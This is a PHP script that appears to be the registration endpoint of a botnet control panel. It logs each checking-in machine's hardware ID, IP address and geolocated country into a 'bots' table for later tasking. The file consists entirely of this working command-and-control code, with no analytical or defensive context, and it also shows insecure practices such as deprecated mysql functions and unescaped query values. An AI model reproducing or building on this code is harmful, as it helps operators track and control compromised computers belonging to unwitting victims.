<?php
include('config.php');

$id = mysql_real_escape_string($_GET['hwid']);

function GetIP() {
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  }
  return $ip;
}

$ip = GetIP();

$api_key = 'key'; 
$data = file_get_contents("http://api.ipinfodb.com/v3/ip-city/?key=$api_key&ip=$ip&format=json"); 
$data = json_decode($data); 
$country = $data->countryCode;

$check = mysql_query("SELECT * FROM `bots` WHERE `hwid`='".mysql_real_escape_string($_GET['hwid'])."' AND `checked`='false'");
if(mysql_num_rows($check) > 0)
{
    exit(0);
}

mysql_query("
    INSERT INTO `bots` 
    SET `ip`='" . $_SERVER['REMOTE_ADDR'] . "', 
        `country`='$country', 
        `hwid`='" . mysql_real_escape_string($_GET['hwid']) . "', 
        `checked`='false'
");

echo mysql_error();
mysql_close($dbcnx);
?>